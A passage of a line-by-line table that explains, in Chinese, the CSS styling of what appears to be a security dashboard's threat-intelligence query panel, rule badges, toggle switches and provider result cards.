| 1198 | 样式属性：设置 `font-weight` 的视觉或布局效果。 | `  font-weight: 500;` |
| 1199 | 样式属性：设置 `width` 的视觉或布局效果。 | `  width: 45%;` |
| 1200 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1201 | 空行：分隔样式规则。 | `&nbsp;` |
| 1202 | 选择器：指定接下来要设置样式的页面元素。 | `.feature-table td {` |
| 1203 | 样式属性：设置 `font-family` 的视觉或布局效果。 | `  font-family: var(--font-mono);` |
| 1204 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 1205 | 样式属性：设置 `text-align` 的视觉或布局效果。 | `  text-align: right;` |
| 1206 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1207 | 空行：分隔样式规则。 | `&nbsp;` |
| 1208 | 选择器：指定接下来要设置样式的页面元素。 | `.confidence-bar {` |
| 1209 | 样式属性：设置 `position` 的视觉或布局效果。 | `  position: relative;` |
| 1210 | 样式属性：设置 `height` 的视觉或布局效果。 | `  height: 6px;` |
| 1211 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--surface-raised);` |
| 1212 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: 3px;` |
| 1213 | 样式属性：设置 `overflow` 的视觉或布局效果。 | `  overflow: hidden;` |
| 1214 | 样式属性：设置 `margin-top` 的视觉或布局效果。 | `  margin-top: var(--space-xs);` |
| 1215 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1216 | 空行：分隔样式规则。 | `&nbsp;` |
| 1217 | 选择器：指定接下来要设置样式的页面元素。 | `.confidence-bar__fill {` |
| 1218 | 样式属性：设置 `position` 的视觉或布局效果。 | `  position: absolute;` |
| 1219 | 样式属性：设置 `inset` 的视觉或布局效果。 | `  inset: 0 auto 0 0;` |
| 1220 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--accent-emerald);` |
| 1221 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: inherit;` |
| 1222 | 样式属性：设置 `transition` 的视觉或布局效果。 | `  transition: width 0.3s ease;` |
| 1223 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1224 | 空行：分隔样式规则。 | `&nbsp;` |
| 1225 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 1226 | 样式注释：说明这一段 CSS 的用途。 | ` * 开关（Switch） — 用于规则启用/禁用等二态操作` |
| 1227 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 1228 | 选择器：指定接下来要设置样式的页面元素。 | `.switch {` |
| 1229 | 样式属性：设置 `--h` 的视觉或布局效果。 | `  --h: 20px;` |
| 1230 | 样式属性：设置 `--w` 的视觉或布局效果。 | `  --w: 36px;` |
| 1231 | 样式属性：设置 `position` 的视觉或布局效果。 | `  position: relative;` |
| 1232 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: inline-flex;` |
| 1233 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 1234 | 样式属性：设置 `width` 的视觉或布局效果。 | `  width: var(--w);` |
| 1235 | 样式属性：设置 `height` 的视觉或布局效果。 | `  height: var(--h);` |
| 1236 | 样式属性：设置 `flex-shrink` 的视觉或布局效果。 | `  flex-shrink: 0;` |
| 1237 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1238 | 空行：分隔样式规则。 | `&nbsp;` |
| 1239 | 选择器：指定接下来要设置样式的页面元素。 | `.switch input {` |
| 1240 | 样式属性：设置 `position` 的视觉或布局效果。 | `  position: absolute;` |
| 1241 | 样式属性：设置 `opacity` 的视觉或布局效果。 | `  opacity: 0;` |
| 1242 | 样式属性：设置 `inset` 的视觉或布局效果。 | `  inset: 0;` |
| 1243 | 样式属性：设置 `margin` 的视觉或布局效果。 | `  margin: 0;` |
| 1244 | 样式属性：设置 `cursor` 的视觉或布局效果。 | `  cursor: pointer;` |
| 1245 | 样式属性：设置 `width` 的视觉或布局效果。 | `  width: 100%;` |
| 1246 | 样式属性：设置 `height` 的视觉或布局效果。 | `  height: 100%;` |
| 1247 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1248 | 空行：分隔样式规则。 | `&nbsp;` |
| 1249 | 选择器：指定接下来要设置样式的页面元素。 | `.switch__track {` |
| 1250 | 样式属性：设置 `position` 的视觉或布局效果。 | `  position: absolute;` |
| 1251 | 样式属性：设置 `inset` 的视觉或布局效果。 | `  inset: 0;` |
| 1252 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--surface-raised);` |
| 1253 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: 1px solid var(--border-default);` |
| 1254 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: 999px;` |
| 1255 | 样式属性：设置 `transition` 的视觉或布局效果。 | `  transition: background 0.15s ease, border-color 0.15s ease;` |
| 1256 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1257 | 空行：分隔样式规则。 | `&nbsp;` |
| 1258 | 选择器：指定接下来要设置样式的页面元素。 | `.switch__thumb {` |
| 1259 | 样式属性：设置 `position` 的视觉或布局效果。 | `  position: absolute;` |
| 1260 | 样式属性：设置 `top` 的视觉或布局效果。 | `  top: 2px;` |
| 1261 | 样式属性：设置 `left` 的视觉或布局效果。 | `  left: 2px;` |
| 1262 | 样式属性：设置 `width` 的视觉或布局效果。 | `  width: calc(var(--h) - 6px);` |
| 1263 | 样式属性：设置 `height` 的视觉或布局效果。 | `  height: calc(var(--h) - 6px);` |
| 1264 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--text-secondary);` |
| 1265 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: 50%;` |
| 1266 | 样式属性：设置 `transition` 的视觉或布局效果。 | `  transition: transform 0.2s ease, background 0.15s ease;` |
| 1267 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1268 | 空行：分隔样式规则。 | `&nbsp;` |
| 1269 | 选择器：指定接下来要设置样式的页面元素。 | `.switch input:checked ~ .switch__track {` |
| 1270 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--accent-emerald-glow);` |
| 1271 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: var(--accent-emerald);` |
| 1272 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1273 | 空行：分隔样式规则。 | `&nbsp;` |
| 1274 | 选择器：指定接下来要设置样式的页面元素。 | `.switch input:checked ~ .switch__thumb {` |
| 1275 | 样式属性：设置 `transform` 的视觉或布局效果。 | `  transform: translateX(calc(var(--w) - var(--h)));` |
| 1276 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--accent-emerald);` |
| 1277 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1278 | 空行：分隔样式规则。 | `&nbsp;` |
| 1279 | 样式属性：设置 `.switch input` 的视觉或布局效果。 | `.switch input:disabled ~ .switch__track,` |
| 1280 | 选择器：指定接下来要设置样式的页面元素。 | `.switch input:disabled ~ .switch__thumb {` |
| 1281 | 样式属性：设置 `opacity` 的视觉或布局效果。 | `  opacity: 0.5;` |
| 1282 | 样式属性：设置 `cursor` 的视觉或布局效果。 | `  cursor: not-allowed;` |
| 1283 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1284 | 空行：分隔样式规则。 | `&nbsp;` |
| 1285 | 选择器：指定接下来要设置样式的页面元素。 | `.switch input:focus-visible ~ .switch__track {` |
| 1286 | 样式属性：设置 `outline` 的视觉或布局效果。 | `  outline: 2px solid var(--accent-emerald);` |
| 1287 | 样式属性：设置 `outline-offset` 的视觉或布局效果。 | `  outline-offset: 2px;` |
| 1288 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1289 | 空行：分隔样式规则。 | `&nbsp;` |
| 1290 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 1291 | 样式注释：说明这一段 CSS 的用途。 | ` * 规则类型徽章（signature / anomaly / threshold）` |
| 1292 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 1293 | 选择器：指定接下来要设置样式的页面元素。 | `.badge--signature {` |
| 1294 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--info-blue);` |
| 1295 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: rgba(96, 165, 250, 0.12);` |
| 1296 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: rgba(96, 165, 250, 0.3);` |
| 1297 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1298 | 空行：分隔样式规则。 | `&nbsp;` |
| 1299 | 选择器：指定接下来要设置样式的页面元素。 | `.badge--anomaly {` |
| 1300 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: #c084fc;` |
| 1301 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: rgba(192, 132, 252, 0.12);` |
| 1302 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: rgba(192, 132, 252, 0.3);` |
| 1303 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1304 | 空行：分隔样式规则。 | `&nbsp;` |
| 1305 | 选择器：指定接下来要设置样式的页面元素。 | `.badge--threshold {` |
| 1306 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--threat-medium);` |
| 1307 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: rgba(245, 158, 11, 0.12);` |
| 1308 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: rgba(245, 158, 11, 0.3);` |
| 1309 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1310 | 空行：分隔样式规则。 | `&nbsp;` |
| 1311 | 选择器：指定接下来要设置样式的页面元素。 | `.badge--action-block {` |
| 1312 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--threat-high);` |
| 1313 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: rgba(239, 68, 68, 0.12);` |
| 1314 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: rgba(239, 68, 68, 0.3);` |
| 1315 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1316 | 空行：分隔样式规则。 | `&nbsp;` |
| 1317 | 选择器：指定接下来要设置样式的页面元素。 | `.badge--action-alert {` |
| 1318 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--threat-medium);` |
| 1319 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: rgba(245, 158, 11, 0.12);` |
| 1320 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: rgba(245, 158, 11, 0.3);` |
| 1321 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1322 | 空行：分隔样式规则。 | `&nbsp;` |
| 1323 | 选择器：指定接下来要设置样式的页面元素。 | `.badge--action-monitor {` |
| 1324 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-secondary);` |
| 1325 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--surface-raised);` |
| 1326 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: var(--border-default);` |
| 1327 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1328 | 空行：分隔样式规则。 | `&nbsp;` |
| 1329 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 1330 | 样式注释：说明这一段 CSS 的用途。 | ` * 表格扩展：操作区 / 禁用行 / 单元格对齐` |
| 1331 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 1332 | 选择器：指定接下来要设置样式的页面元素。 | `.table__row--disabled {` |
| 1333 | 样式属性：设置 `opacity` 的视觉或布局效果。 | `  opacity: 0.55;` |
| 1334 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1335 | 空行：分隔样式规则。 | `&nbsp;` |
| 1336 | 选择器：指定接下来要设置样式的页面元素。 | `.table__actions {` |
| 1337 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: inline-flex;` |
| 1338 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-xs);` |
| 1339 | 样式属性：设置 `justify-content` 的视觉或布局效果。 | `  justify-content: flex-end;` |
| 1340 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1341 | 空行：分隔样式规则。 | `&nbsp;` |
| 1342 | 样式语句：参与页面视觉布局。 | `.table td.num,` |
| 1343 | 选择器：指定接下来要设置样式的页面元素。 | `.table th.num {` |
| 1344 | 样式属性：设置 `text-align` 的视觉或布局效果。 | `  text-align: right;` |
| 1345 | 样式属性：设置 `font-variant-numeric` 的视觉或布局效果。 | `  font-variant-numeric: tabular-nums;` |
| 1346 | 样式属性：设置 `font-family` 的视觉或布局效果。 | `  font-family: var(--font-mono);` |
| 1347 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1348 | 空行：分隔样式规则。 | `&nbsp;` |
| 1349 | 样式语句：参与页面视觉布局。 | `.table td.center,` |
| 1350 | 选择器：指定接下来要设置样式的页面元素。 | `.table th.center {` |
| 1351 | 样式属性：设置 `text-align` 的视觉或布局效果。 | `  text-align: center;` |
| 1352 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1353 | 空行：分隔样式规则。 | `&nbsp;` |
| 1354 | 选择器：指定接下来要设置样式的页面元素。 | `.table__cell-pattern {` |
| 1355 | 样式属性：设置 `font-family` 的视觉或布局效果。 | `  font-family: var(--font-mono);` |
| 1356 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-mono);` |
| 1357 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 1358 | 样式属性：设置 `max-width` 的视觉或布局效果。 | `  max-width: 320px;` |
| 1359 | 样式属性：设置 `overflow` 的视觉或布局效果。 | `  overflow: hidden;` |
| 1360 | 样式属性：设置 `text-overflow` 的视觉或布局效果。 | `  text-overflow: ellipsis;` |
| 1361 | 样式属性：设置 `white-space` 的视觉或布局效果。 | `  white-space: nowrap;` |
| 1362 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1363 | 空行：分隔样式规则。 | `&nbsp;` |
| 1364 | 样式注释：说明这一段 CSS 的用途。 | `/* 规则编辑抽屉略宽于告警抽屉 */` |
| 1365 | 选择器：指定接下来要设置样式的页面元素。 | `.drawer--wide {` |
| 1366 | 样式属性：设置 `width` 的视觉或布局效果。 | `  width: min(560px, 100%);` |
| 1367 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1368 | 空行：分隔样式规则。 | `&nbsp;` |
| 1369 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 1370 | 样式注释：说明这一段 CSS 的用途。 | ` * 威胁情报 - 查询面板与结果卡` |
| 1371 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 1372 | 选择器：指定接下来要设置样式的页面元素。 | `.query-panel {` |
| 1373 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: grid;` |
| 1374 | 样式属性：设置 `grid-template-columns` 的视觉或布局效果。 | `  grid-template-columns: minmax(0, 1fr);` |
| 1375 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-md);` |
| 1376 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1377 | 空行：分隔样式规则。 | `&nbsp;` |
| 1378 | 选择器：指定接下来要设置样式的页面元素。 | `.query-panel__inputs {` |
| 1379 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: grid;` |
| 1380 | 样式属性：设置 `grid-template-columns` 的视觉或布局效果。 | `  grid-template-columns: minmax(160px, auto) minmax(220px, 1fr) auto;` |
| 1381 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-md);` |
| 1382 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: flex-end;` |
| 1383 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1384 | 空行：分隔样式规则。 | `&nbsp;` |
| 1385 | 选择器：指定接下来要设置样式的页面元素。 | `@media (max-width: 767px) {` |
| 1386 | 选择器：指定接下来要设置样式的页面元素。 | `  .query-panel__inputs {` |
| 1387 | 样式属性：设置 `grid-template-columns` 的视觉或布局效果。 | `    grid-template-columns: 1fr;` |
| 1388 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 1389 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1390 | 空行：分隔样式规则。 | `&nbsp;` |
| 1391 | 选择器：指定接下来要设置样式的页面元素。 | `.query-verdict {` |
| 1392 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 1393 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 1394 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-md);` |
| 1395 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-md) var(--space-lg);` |
| 1396 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: var(--radius-lg);` |
| 1397 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: 1px solid var(--border-subtle);` |
| 1398 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--surface-mid);` |
| 1399 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1400 | 空行：分隔样式规则。 | `&nbsp;` |
| 1401 | 选择器：指定接下来要设置样式的页面元素。 | `.query-verdict--clean {` |
| 1402 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: rgba(16, 185, 129, 0.35);` |
| 1403 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--accent-emerald-glow);` |
| 1404 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1405 | 空行：分隔样式规则。 | `&nbsp;` |
| 1406 | 选择器：指定接下来要设置样式的页面元素。 | `.query-verdict--threat {` |
| 1407 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: rgba(239, 68, 68, 0.4);` |
| 1408 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: rgba(239, 68, 68, 0.08);` |
| 1409 | 样式属性：设置 `box-shadow` 的视觉或布局效果。 | `  box-shadow: var(--shadow-1);` |
| 1410 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1411 | 空行：分隔样式规则。 | `&nbsp;` |
| 1412 | 选择器：指定接下来要设置样式的页面元素。 | `.query-verdict__status {` |
| 1413 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-h2);` |
| 1414 | 样式属性：设置 `font-weight` 的视觉或布局效果。 | `  font-weight: 600;` |
| 1415 | 样式属性：设置 `letter-spacing` 的视觉或布局效果。 | `  letter-spacing: 0.02em;` |
| 1416 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1417 | 空行：分隔样式规则。 | `&nbsp;` |
| 1418 | 选择器：指定接下来要设置样式的页面元素。 | `.query-verdict--clean .query-verdict__status {` |
| 1419 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--accent-emerald);` |
| 1420 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1421 | 空行：分隔样式规则。 | `&nbsp;` |
| 1422 | 选择器：指定接下来要设置样式的页面元素。 | `.query-verdict--threat .query-verdict__status {` |
| 1423 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--threat-high);` |
| 1424 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1425 | 空行：分隔样式规则。 | `&nbsp;` |
| 1426 | 选择器：指定接下来要设置样式的页面元素。 | `.query-verdict__detail {` |
| 1427 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-secondary);` |
| 1428 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 1429 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1430 | 空行：分隔样式规则。 | `&nbsp;` |
| 1431 | 选择器：指定接下来要设置样式的页面元素。 | `.query-verdict__value {` |
| 1432 | 样式属性：设置 `font-family` 的视觉或布局效果。 | `  font-family: var(--font-mono);` |
| 1433 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--info-blue);` |
| 1434 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1435 | 空行：分隔样式规则。 | `&nbsp;` |
| 1436 | 选择器：指定接下来要设置样式的页面元素。 | `.provider-grid {` |
| 1437 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: grid;` |
| 1438 | 样式属性：设置 `grid-template-columns` 的视觉或布局效果。 | `  grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));` |
| 1439 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-md);` |
| 1440 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1441 | 空行：分隔样式规则。 | `&nbsp;` |
| 1442 | 选择器：指定接下来要设置样式的页面元素。 | `.provider-card {` |
| 1443 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--surface-mid);` |
| 1444 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: 1px solid var(--border-subtle);` |
| 1445 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: var(--radius-md);` |
| 1446 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-md);` |
| 1447 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 1448 | 样式属性：设置 `flex-direction` 的视觉或布局效果。 | `  flex-direction: column;` |
| 1449 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-sm);` |
| 1450 | 样式属性：设置 `min-height` 的视觉或布局效果。 | `  min-height: 180px;` |
| 1451 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1452 | 空行：分隔样式规则。 | `&nbsp;` |
| 1453 | 选择器：指定接下来要设置样式的页面元素。 | `.provider-card__header {` |
| 1454 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 1455 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 1456 | 样式属性：设置 `justify-content` 的视觉或布局效果。 | `  justify-content: space-between;` |
| 1457 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-sm);` |
| 1458 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1459 | 空行：分隔样式规则。 | `&nbsp;` |
| 1460 | 选择器：指定接下来要设置样式的页面元素。 | `.provider-card__title {` |
| 1461 | 样式属性：设置 `margin` 的视觉或布局效果。 | `  margin: 0;` |
| 1462 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-body);` |
| 1463 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 1464 | 样式属性：设置 `text-transform` 的视觉或布局效果。 | `  text-transform: uppercase;` |
| 1465 | 样式属性：设置 `letter-spacing` 的视觉或布局效果。 | `  letter-spacing: 0.05em;` |
| 1466 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1467 | 空行：分隔样式规则。 | `&nbsp;` |
| 1468 | 选择器：指定接下来要设置样式的页面元素。 | `.provider-card__status {` |
| 1469 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 1470 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-tertiary);` |
| 1471 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1472 | 空行：分隔样式规则。 | `&nbsp;` |
| 1473 | 选择器：指定接下来要设置样式的页面元素。 | `.provider-card--hit {` |
| 1474 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: rgba(239, 68, 68, 0.35);` |
| 1475 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: rgba(239, 68, 68, 0.05);` |
| 1476 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1477 | 空行：分隔样式规则。 | `&nbsp;` |
| 1478 | 选择器：指定接下来要设置样式的页面元素。 | `.provider-card--clean {` |
| 1479 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: rgba(16, 185, 129, 0.25);` |
| 1480 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1481 | 空行：分隔样式规则。 | `&nbsp;` |
| 1482 | 选择器：指定接下来要设置样式的页面元素。 | `.provider-card--disabled {` |
| 1483 | 样式属性：设置 `opacity` 的视觉或布局效果。 | `  opacity: 0.6;` |
| 1484 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1485 | 空行：分隔样式规则。 | `&nbsp;` |
| 1486 | 选择器：指定接下来要设置样式的页面元素。 | `.provider-card__body {` |
| 1487 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-secondary);` |
| 1488 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 1489 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: grid;` |
| 1490 | 样式属性：设置 `grid-template-columns` 的视觉或布局效果。 | `  grid-template-columns: auto 1fr;` |
| 1491 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: 4px var(--space-sm);` |
| 1492 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1493 | 空行：分隔样式规则。 | `&nbsp;` |
| 1494 | 选择器：指定接下来要设置样式的页面元素。 | `.provider-card__body dt {` |
| 1495 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-tertiary);` |
| 1496 | 样式属性：设置 `text-transform` 的视觉或布局效果。 | `  text-transform: uppercase;` |
| 1497 | 样式属性：设置 `letter-spacing` 的视觉或布局效果。 | `  letter-spacing: 0.04em;` |
| 1498 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: 11px;` |
| 1499 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1500 | 空行：分隔样式规则。 | `&nbsp;` |
| 1501 | 选择器：指定接下来要设置样式的页面元素。 | `.provider-card__body dd {` |
| 1502 | 样式属性：设置 `margin` 的视觉或布局效果。 | `  margin: 0;` |
| 1503 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 1504 | 样式属性：设置 `word-break` 的视觉或布局效果。 | `  word-break: break-all;` |
| 1505 | 样式属性：设置 `font-family` 的视觉或布局效果。 | `  font-family: var(--font-mono);` |
| 1506 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-mono);` |
| 1507 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1508 | 空行：分隔样式规则。 | `&nbsp;` |
| 1509 | 选择器：指定接下来要设置样式的页面元素。 | `.provider-card__footer {` |
| 1510 | 样式属性：设置 `margin-top` 的视觉或布局效果。 | `  margin-top: auto;` |
| 1511 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 1512 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-tertiary);` |
| 1513 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 1514 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-sm);` |
| 1515 | 样式属性：设置 `flex-wrap` 的视觉或布局效果。 | `  flex-wrap: wrap;` |
| 1516 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1517 | 空行：分隔样式规则。 | `&nbsp;` |
| 1518 | 选择器：指定接下来要设置样式的页面元素。 | `.provider-card__loader {` |
| 1519 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 1520 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 1521 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-sm);` |
| 1522 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-tertiary);` |
| 1523 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 1524 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1525 | 空行：分隔样式规则。 | `&nbsp;` |
| 1526 | 选择器：指定接下来要设置样式的页面元素。 | `.badge--mock {` |
| 1527 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--threat-medium);` |
| 1528 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: rgba(245, 158, 11, 0.1);` |
| 1529 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: rgba(245, 158, 11, 0.3);` |
| 1530 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1531 | 空行：分隔样式规则。 | `&nbsp;` |
| 1532 | 选择器：指定接下来要设置样式的页面元素。 | `.badge--hit {` |
| 1533 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--threat-high);` |
| 1534 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: rgba(239, 68, 68, 0.12);` |
| 1535 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: rgba(239, 68, 68, 0.3);` |
| 1536 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1537 | 空行：分隔样式规则。 | `&nbsp;` |
| 1538 | 选择器：指定接下来要设置样式的页面元素。 | `.badge--clean {` |
| 1539 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--accent-emerald);` |
| 1540 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--accent-emerald-glow);` |
| 1541 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: rgba(16, 185, 129, 0.3);` |
| 1542 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1543 | 空行：分隔样式规则。 | `&nbsp;` |
